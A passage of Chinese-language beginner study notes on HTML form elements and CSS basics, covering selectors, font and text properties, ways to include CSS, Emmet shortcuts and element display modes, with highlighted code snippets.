睡觉&lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span> = &quot;checkbox/&gt;&quot; 打豆豆&lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span> = &quot;checkbox/&gt;&quot;<br><br><br></code></pre></td></tr></table></figure><p>name属性：分别不同表单元素<br>value属性：给此元素一个默认值，如“请输入用户名”。单选框也应写value，用于向后台传递信息。即规定input元素值。<br><strong>以上两个元素，每个input都应该有！</strong><br><br><br>checked属性：当页面打开的时候，会默认选中该按钮（单选或复选）</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;input type <span class="hljs-operator">=</span> <span class="hljs-string">&quot;checkbox&quot;</span> checked <span class="hljs-operator">=</span> <span class="hljs-string">&quot;checked&quot;</span>/&gt;<br></code></pre></td></tr></table></figure><p>maxlength：规定输入最大长度</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;input type <span class="hljs-operator">=</span> <span class="hljs-string">&quot;checkbox&quot;</span> checked <span class="hljs-operator">=</span> <span class="hljs-string">&quot;checked&quot;</span> maxlength <span class="hljs-operator">=</span> <span class="hljs-string">&quot;6&quot;</span>/&gt;<br></code></pre></td></tr></table></figure><p><br><br>提交按钮submit<br>重置按钮reset</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ada">&lt;input <span class="hljs-keyword">type</span> <span class="hljs-type">= </span><span class="hljs-string">&quot;submit&quot;</span>&gt;<br>&lt;input <span class="hljs-keyword">type</span> <span class="hljs-type">= </span><span class="hljs-string">&quot;submit&quot;</span> value = <span class="hljs-string">&quot;免费注册&quot;</span>&gt;<br>可以用value值来替换“提交”<br>&lt;input <span class="hljs-keyword">type</span> <span class="hljs-type">= </span><span class="hljs-string">&quot;reset&quot;</span> value = <span class="hljs-string">&quot;重新填写&quot;</span>&gt;<br>还原为默认值<br></code></pre></td></tr></table></figure><p>普通按钮button<br>文件域file</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stata">&lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span> = <span class="hljs-string">&quot;button&quot;</span> value = <span class="hljs-string">&quot;获取验证码&quot;</span>&gt;<br>&lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span> = <span class="hljs-string">&quot;file&quot;</span> &gt;<br><span class="hljs-keyword">file</span>加不了value。<br></code></pre></td></tr></table></figure><p>lable标签<br>lable用于绑定一个表单元素，当点击lable内的文本，浏览器会自动选择对应表单<br>语法:</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stata">&lt;<span class="hljs-keyword">label</span> <span class="hljs-keyword">for</span> = <span class="hljs-string">&quot;sex&quot;</span>&gt;男&lt;/<span class="hljs-keyword">label</span>&gt;<br>&lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span> = <span class="hljs-string">&quot;radio&quot;</span> name = <span class="hljs-string">&quot;sex&quot;</span> value = <span class="hljs-string">&quot;male&quot;</span> id = <span class="hljs-string">&quot;sex&quot;</span>/&gt;<br>核心：<br><span class="hljs-keyword">label</span>中的<span class="hljs-keyword">for</span>与表单元素中的id要相同。<br>不要写错<span class="hljs-keyword">label</span>！！！！<br></code></pre></td></tr></table></figure><p>select下拉表单元素</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml">籍贯:<br><span class="hljs-tag">&lt;<span class="hljs-name">select</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">option</span>&gt;</span>o1<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">selected</span> = <span class="hljs-string">&quot;selected&quot;</span>&gt;</span>o2<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br>加selected会默认选中。<br></code></pre></td></tr></table></figure><p>textarea文本域表单元素：<br>如大量书写文字，个人简介120字。</p><figure class="highlight stan"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stan">&lt;textarea <span class="hljs-built_in">rows</span> = <span class="hljs-string">&quot;3&quot;</span> <span class="hljs-built_in">cols</span> = <span class="hljs-string">&quot;20&quot;</span>&gt;<br>&lt;/textarea&gt;<br><span class="hljs-built_in">rows</span>与<span class="hljs-built_in">cols</span>基本上不使用，以后用css改<br></code></pre></td></tr></table></figure><h2 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h2><p>css是网页的美容师<br>html的局限性：只关注内容的语义，<strong>丑</strong></p><h4 id="css语法规范"><a href="#css语法规范" class="headerlink" title="css语法规范"></a>css语法规范</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;IE=edge&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>测试案例<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css">        <span class="hljs-selector-tag">p</span> &#123;</span><br><span class="language-css">            <span class="hljs-attribute">color</span>:red;</span><br><span class="language-css">        &#125;</span><br><span class="language-css">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><br>    you<br>   <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br>于<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>标签内加入<span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css">标签，于style内，格式为</span><br><span class="language-css">目标 &#123;属性:属性值;&#125;记得分号结尾</span><br><span class="language-css"></span><br><span class="language-css"><span class="hljs-selector-tag">p</span> &#123;<span class="hljs-attribute">color</span>:red;</span><br><span class="language-css">    <span class="hljs-attribute">font-size</span> : <span class="hljs-number">12px</span>;&#125;</span><br></code></pre></td></tr></table></figure><h4 id="CSS选择器"><a href="#CSS选择器" class="headerlink" title="CSS选择器"></a>CSS选择器</h4><p>根据不同需求选出不同标签<br>基础选择器：</p><h5 id="标签选择器"><a href="#标签选择器" class="headerlink" title="标签选择器"></a>标签选择器</h5><p>以标签名作为选择器</p><h5 id="类选择器"><a href="#类选择器" class="headerlink" title="类选择器"></a>类选择器</h5><p>可单独选择一个，或某几个标签。<br>先定义类，再将元素拉入类</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css"><span class="hljs-selector-class">.red</span> &#123;</span><br><span class="language-css"> <span class="hljs-attribute">color</span>: red;</span><br><span class="language-css">&#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br>...<br><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span> = <span class="hljs-string">&quot;red&quot;</span>&gt;</span>红色<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br></code></pre></td></tr></table></figure><p>定义类：<code>.</code>+类名<br>调用类：标签内加入class = “类名”<br>长类名用<code>-</code>短横线链接<code>.star-st</code></p><h5 id="多类名"><a href="#多类名" class="headerlink" title="多类名"></a>多类名</h5><p>可以在class属性中写多个类名<br>必须用空格隔开！</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">&lt;div <span class="hljs-keyword">class</span> = &quot;<span class="hljs-symbol">red</span> <span class="hljs-symbol">green</span>&quot;&gt;&lt;/<span class="hljs-symbol">div</span>&gt;<br></code></pre></td></tr></table></figure><h5 id="id选择器"><a href="#id选择器" class="headerlink" title="id选择器"></a>id选择器</h5><p>html元素用id属性来调用，style中用#定义</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-comment">#pink &#123;</span><br>    color : pink;<br>&#125;<br>...<br>&lt;<span class="hljs-keyword">div</span> <span class="hljs-built_in">id</span> = <span class="hljs-string">&quot;pink&quot;</span>&gt;michell&lt;/<span class="hljs-keyword">div</span>&gt;<br></code></pre></td></tr></table></figure><p>与类选择器的区别：<br><strong>只能被调用一次</strong>，被第一个调用者成功调用后，无法再次被调用。</p><h5 id="通配符选择器"><a href="#通配符选择器" class="headerlink" title="通配符选择器"></a>通配符选择器</h5><p>用<code>*</code>定义，它会选取页面中所有元素。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css">* &#123;<br>    <span class="hljs-attribute">color</span>: red;<br>&#125;<br></code></pre></td></tr></table></figure><p>通配符选择器不需要调用，自动给所有元素使用指定的样式。</p><h4 id="CSS字体"><a href="#CSS字体" class="headerlink" title="CSS字体"></a>CSS字体</h4><p>字体系列</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span>&#123;<br>    <span class="hljs-attribute">font-family</span>:<span class="hljs-string">&quot;Microsoft YaHei&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>字体大小</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span>&#123;<br>    <span class="hljs-attribute">font-size</span>: <span class="hljs-number">20px</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>字体粗细</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-selector-tag">p</span>&#123;<br>    <span class="hljs-attribute">font-weight</span>: normal;<br>&#125;<br>有以下几个参数<br>bold：粗体 number ：<span class="hljs-number">700</span>；<br>bolder：更粗<br>lighter：细体<br>number：加数字，<span class="hljs-number">700</span>是加粗，<span class="hljs-number">400</span>是正常<br><span class="hljs-attribute">font-weight</span>: <span class="hljs-number">700</span>;<br></code></pre></td></tr></table></figure><p>文字样式</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span>&#123;<br>    <span class="hljs-attribute">font-style</span>: normal;<br>&#125;<br>italic:斜体<br></code></pre></td></tr></table></figure><p>字体复合属性</p><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs hsp">body&#123;<br>    <span class="hljs-keyword">font</span>: <span class="hljs-keyword">font</span>-style <span class="hljs-keyword">font</span>-weight <span class="hljs-keyword">font</span>-size/<span class="hljs-keyword">line</span>-height <span class="hljs-keyword">font</span>-family<span class="hljs-comment">;</span><br>    <span class="hljs-keyword">font</span>: italic <span class="hljs-number">700</span> <span class="hljs-number">16</span>px/<span class="hljs-number">20</span>px(<span class="hljs-number">20</span>px可不写) <span class="hljs-string">&#x27;microsoft yahei&#x27;</span><span class="hljs-comment">;</span><br>    不能更改顺序<br>    只有size和family不能省略，其余部分省略则取默认值。<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="文本属性"><a href="#文本属性" class="headerlink" title="文本属性"></a>文本属性</h4><p><strong>文本颜色</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span> &#123;<br>    <span class="hljs-attribute">color</span>: red;<br>&#125;<br></code></pre></td></tr></table></figure><p>也可以是16进制如：<br>#ff0000；<br>或rgb(255,0,0)；</p><p><strong>文本对齐</strong><br>text-align用于设置元素内文本内容的水平对齐方式</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-tag">div</span> &#123;<br>    <span class="hljs-attribute">text-align</span> : left(默认值);<br>&#125;<br><span class="hljs-function"><span class="hljs-title">left</span><span class="hljs-params">(默认左对齐)</span></span><br><span class="hljs-function"><span class="hljs-title">right</span><span class="hljs-params">(右对齐)</span></span><br><span class="hljs-function"><span class="hljs-title">center</span><span class="hljs-params">(居中对齐)</span></span><br></code></pre></td></tr></table></figure><p><strong>装饰文本</strong><br>text-decoration属性规定添加到文本的修饰。可以添加下划线，删除线，上划线。</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-selector-tag">div</span>&#123;<br>    <span class="hljs-attribute">text-decoration</span>: underline;<br>&#125;<br><span class="hljs-attribute">none</span>默认<br>underline下划线<br>line-throught删除线<br>overline上划线<br></code></pre></td></tr></table></figure><p>取消链接的下划线：<br>a{<br>    text-decoration: none;<br>}<br><strong>文本缩进</strong><br>text-indent属性用于指定文本第一行的缩进。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span> &#123;<br>    <span class="hljs-attribute">text-indent</span>: <span class="hljs-number">10px</span>;<br>&#125;<br>只缩进首行！<br></code></pre></td></tr></table></figure><p>或使用em：当前元素一个文字的大小</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span>&#123;<br>    <span class="hljs-attribute">text-indent</span>: <span class="hljs-number">2em</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>行间距</strong><br>line-height属性用于设置行间的距离。<br>行间距由文本高度，上间距，下间距三者构成。<br>改变的是上、下间距。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span>&#123;<br>    <span class="hljs-attribute">line-height</span>: <span class="hljs-number">16px</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="CSS的引入方式"><a href="#CSS的引入方式" class="headerlink" title="CSS的引入方式"></a>CSS的引入方式</h4><p>按照css书写位置不同，css可以分为三大类<br><strong>内部样式表</strong><br>全部写入style标签内部<br>理论上&lt;style&gt;可以放在任意处，但一般放在head内<br>是嵌入式引用。<br><strong>行内样式表</strong><br>简单的修改：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">&lt;<span class="hljs-keyword">div</span> style = <span class="hljs-string">&quot;color : pink;&quot;</span>&gt;...&lt;/<span class="hljs-keyword">div</span>&gt;<br></code></pre></td></tr></table></figure><p>单个的，简单的修改。<br><strong>外部样式表</strong><br>样式单独写在style文件内，再进行调用</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs abnf">新建一个后缀名为.css的文件<br>在这个文件里面，直接写样式，不需要style标签<br>使用&lt;link&gt;标签引入到html文件里<br>&lt;link rel <span class="hljs-operator">=</span> <span class="hljs-string">&quot;stylesheet&quot;</span> href <span class="hljs-operator">=</span> <span class="hljs-string">&quot;style.css（css文件路径）&quot;</span>/&gt;<br></code></pre></td></tr></table></figure><h4 id="Emmet语法"><a href="#Emmet语法" class="headerlink" title="Emmet语法"></a>Emmet语法</h4><p>emmet语法使用缩写提高编写速度。<br>1.快速生成HTML结构语法</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-keyword">div</span>+<span class="hljs-literal">tab</span><br><span class="hljs-keyword">div</span>*<span class="hljs-number">10</span>+<span class="hljs-literal">tab</span><br>ul&gt;li*<span class="hljs-number">3</span><br><span class="hljs-keyword">div</span>+p<br>p.one(类名) == &lt;p <span class="hljs-built_in">class</span> = <span class="hljs-string">&quot;one&quot;</span>&gt;&lt;/p&gt;<br>p<span class="hljs-comment">#one(类名) == &lt;p id = &quot;one&quot;&gt;&lt;/p&gt;</span><br>即.就是生成类为此类名的元素，<span class="hljs-comment">#同理</span><br>.demo$*<span class="hljs-number">5</span>会生成以demo1~demo5为类的<span class="hljs-number">5</span>个<span class="hljs-keyword">div</span><br><span class="hljs-keyword">div</span>&#123;测试&#125; == &lt;<span class="hljs-keyword">div</span>&gt;测试&lt;/<span class="hljs-keyword">div</span>&gt;<br>$是自增符号<br><span class="hljs-keyword">div</span>&#123;$&#125;*<span class="hljs-number">5</span> == &lt;<span class="hljs-keyword">div</span>&gt;<span class="hljs-number">1</span>~<span class="hljs-number">5</span>&lt;/<span class="hljs-keyword">div</span>&gt;<br></code></pre></td></tr></table></figure><p>2.emmet语法快速生成css样式</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">tac</span> = text-align:center<span class="hljs-comment">;</span><br><span class="hljs-attr">w100</span> = weight: <span class="hljs-number">100</span>px<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>3.快速格式化代码</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">vscode直接右键，选格式化文档，会自动对齐所有代码<br></code></pre></td></tr></table></figure><h4 id="css复合选择器"><a href="#css复合选择器" class="headerlink" title="css复合选择器"></a>css复合选择器</h4><p><strong>后代选择器（重要）</strong><br>后代选择器<br>例如：我想把ol内的li全部定一个样式，而ul中不变</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">ol</span> <span class="hljs-selector-tag">li</span>&#123;<br>    <span class="hljs-attribute">color</span>:pink;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs css">元素<span class="hljs-number">1</span> 元素<span class="hljs-number">2</span>&#123;<br>    <span class="hljs-attribute">color</span>: pink;<br>&#125;<br>元素<span class="hljs-number">2</span>是元素<span class="hljs-number">1</span>后代。<br><span class="hljs-number">1</span>，<span class="hljs-number">2</span>之间用空格隔开<br>可以套很多层，但后者必须是前一个的后代<br>可以是任意基础选择器的组合<br><span class="hljs-selector-class">.nav</span> <span class="hljs-selector-tag">ul</span> <span class="hljs-selector-tag">a</span>&#123;<br><span class="hljs-attribute">color</span>: yellow;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>子选择器</strong><br>子选择器只能选择某元素最近一级的子元素<br>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css">元素<span class="hljs-number">1</span>&gt;元素<span class="hljs-number">2</span>&#123;<br><span class="hljs-attribute">color</span>: red;<br>&#125;<br>即只选择元素<span class="hljs-number">1</span>内离近的<span class="hljs-number">2</span>的儿子，作为对象。<br></code></pre></td></tr></table></figure><p><strong>并集选择器</strong><br>并集选择器可以选择多组标签，同时为他们定义相同样式</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span>,<span class="hljs-selector-tag">p</span>&#123;<br><span class="hljs-attribute">color</span>: pink;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>伪类选择器</strong><br>伪类选择器书写最大的特点是用冒号<code>:</code>表示</p><p>链接伪类选择器</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:link</span>  选择所有未访问过的链接<br><br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:link</span>&#123;<br>    <span class="hljs-attribute">color</span>: <span class="hljs-number">#333</span>;<br>    <span class="hljs-attribute">text-decoration</span>: none;<br>&#125;<br><br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:visited</span>   选择所有已被访问的链接<br><br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:visited</span>&#123;<br>    <span class="hljs-attribute">color</span>: orange;<br>&#125;<br><br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:hover</span>   选择鼠标经过的那一个链接<br><br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:hover</span>&#123;<br>    <span class="hljs-attribute">color</span>: skyblue;<br>&#125;<br><br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:active</span>选择鼠标按下，但未弹起鼠标的那个链接<br><br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:active</span>&#123;<br>    <span class="hljs-attribute">color</span>: green;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>注意事项：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs css">为保证链接系列生效，必须保证LVHA的顺序进行声明。<br>链接都有默认样式，必须用<span class="hljs-selector-tag">a</span>单独指定样式<br>开发中：<br><span class="hljs-selector-tag">a</span> &#123;<br>    <span class="hljs-attribute">color</span>: grey;<br>&#125;<br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:hover</span>&#123;<br>    <span class="hljs-attribute">color</span>: skyblue;<br>&#125;<br>即可<br></code></pre></td></tr></table></figure><p><strong>focus伪类选择器</strong><br>用于选取获得焦点的表单元素。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">input</span><span class="hljs-selector-pseudo">:focus</span>&#123;<br>    <span class="hljs-attribute">background-color</span>: pink;<br>&#125;<br>则获得光标的<span class="hljs-selector-tag">input</span>元素，背景会变为pink色。<br></code></pre></td></tr></table></figure><h4 id="元素的显示模式"><a href="#元素的显示模式" class="headerlink" title="元素的显示模式"></a>元素的显示模式</h4><p>元素显示模式就是元素（标签）以什么方式进行显示</p><p>如div独占一行，但一行可以放很多span</p><p>HTML元素一般分为块元素和行内元素两种类型。</p><p><strong>块元素</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>~<span class="hljs-tag">&lt;<span class="hljs-name">h6</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>等等，都是块元素<br>特点：<br>霸道，独占一行<br>可以嵌套，成为容器<br>但<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>标签以及<span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>系列标签主要存放文字，所以其中不能放块级元素<br>宽度默认是容器的100%<br></code></pre></td></tr></table></figure><p><strong>行内元素</strong></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">&lt;<span class="hljs-keyword">a</span>&gt;,&lt;strong&gt;......<br>特点:<br>一行可以写多个，放在一行内显示<br>高、宽直接设置是无效的<br>默认宽度就是本身内容的宽度<br>行内元素内只能放文本或其他行内元素<br>注意：<br><span class="hljs-keyword">a</span>内不能放<span class="hljs-keyword">a</span><br><span class="hljs-keyword">a</span>内可以放块级元素。但给<span class="hljs-keyword">a</span>转换为块级模式最安全<br></code></pre></td></tr></table></figure><p><strong>行内块元素</strong><br>如img，input标签</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">特点：<br>一行内可以放多个此元素，中间会有空白空隙<br>此元素可以设置宽和高<br></code></pre></td></tr></table></figure><p><strong>元素显示模式的转换</strong><br>如：a链接增加其触发范围<br>转换为块元素:<br>display:block;<br>转换为行内元素：<br>display:inline;</p><p><strong>单行文字垂直居中</strong><br>小技巧：<br>让文字行高等于盒子的高度</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-attribute">height</span>: <span class="hljs-number">40px</span>;<br><span class="hljs-attribute">line-height</span>: <span class="hljs-number">40px</span>;<br></code></pre></td></tr></table></figure><h3 id="CSS3列表"><a href="#CSS3列表" class="headerlink" title="CSS3列表"></a>CSS3列表</h3><p>为ul、ol设置不同的列表项标记<br><code>list-style-type</code></p><figure class="highlight dsconfig"><table><tr><td 